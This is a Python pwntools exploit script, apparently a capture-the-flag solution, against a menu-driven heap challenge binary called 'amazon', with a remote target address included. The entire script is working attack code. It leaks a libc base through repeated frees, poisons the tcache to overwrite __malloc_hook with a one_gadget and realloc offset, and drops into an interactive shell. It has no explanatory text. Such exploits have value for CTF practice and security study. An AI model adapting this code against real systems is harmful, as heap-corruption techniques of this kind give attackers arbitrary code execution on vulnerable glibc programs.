#coding=utf-8
from pwn import *
from time import sleep
context.update(arch='amd64',os='linux',log_level='DEBUG')
# context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./amazon')
libc_offset = 0x3c4b20
gadgets = [0x4f2c5,0x4f322,0x10a38c]
if debug:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process('./amazon')

else:
    libc = ELF('./libc-2.27.so')
    p = remote('121.41.38.38',9999)

def Alloc(item_choice,num,size,content):
    p.recvuntil('choice: ')
    p.sendline('1')
    p.recvuntil("What item do you want to buy: ")
    p.sendline(str(item_choice))
    p.recvuntil("How many: ")
    p.sendline(str(num))
    p.recvuntil("How long is your note: ")
    p.sendline(str(size))
    if size > 0:
        p.recvuntil(": ")
        #sleep(0.2)
        p.send(content)

def Show():
    p.recvuntil('choice: ')
    p.sendline('2')

def Free(idx):
    p.recvuntil('choice: ')
    p.sendline('3')
    p.recvuntil("Which item are you going to pay for: ")
    p.sendline(str(idx))

def exp():
    #leak libc
    Alloc(1,1,0x80,'0')#0
    Alloc(1,1,0x80,'1')#1
    for i in range(8):
        Free(0)
    Show()
   
    p.recvuntil("Name: ")
    libc_base = u64(p.recvuntil('\x7f').ljust(8,'\x00')) - 96 - 0x3ebc40
    log.success('libc base => ' + hex(libc_base))
    malloc_hook = libc_base + libc.sym['__malloc_hook']
    #system_addr = libc_base + libc.sym['system']
    realloc_addr = libc_base + libc.sym['realloc']

    #get shell
    Alloc(1,1,0,'0')#2

    Alloc(1,1,0x50,'0')#3
    #
    Free(3)
    payload= p64(0)+p64(0x81)+p64(malloc_hook-0x28)
    Alloc(1,1,0x80,payload)#4
    gdb.attach(p)
    Alloc(1,1,0x50,"/bin/sh\x00")#5
    p.recvuntil('choice: ')
    p.sendline('1')
    p.recvuntil("What item do you want to buy: ")
    p.sendline(str(1))
    p.recvuntil("How many: ")
    p.sendline(str(2))
    p.recvuntil("How long is your note: ")
    p.sendline(str(80))
    #print p.recv(128)
    p.recvuntil("Content: ")
    shell_addr = libc_base + gadgets[1]
    p.send(p64(shell_addr)+p64(realloc_addr+0x4))
    #Alloc(1,1,0x50,p64(system_addr))#6
    #gdb.attach(p)
    Alloc(1,1,0,'0')
    #Free(5)

    p.interactive()

exp()